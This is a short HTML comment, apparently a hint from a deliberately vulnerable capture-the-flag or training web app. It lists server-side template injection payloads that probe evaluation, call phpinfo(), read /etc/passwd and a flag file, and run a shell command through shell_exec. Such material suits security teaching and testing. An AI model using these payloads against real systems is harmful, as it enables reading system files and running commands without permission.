...
<!--
    ...
    1. Basic test: ${7*7} should output 49
    
    2. Read PHP info: ${phpinfo()}
    
    3. Read file contents: ${file_get_contents('/etc/passwd')}
    
    4. Get the flag: ${file_get_contents('includes/ssti_flag.txt')}
       Or: ${shell_exec('cat includes/ssti_flag.txt')}
    
    5. Alternative syntax: {{= 7*7 }}
    
    The flag is stored in: includes/ssti_flag.txt
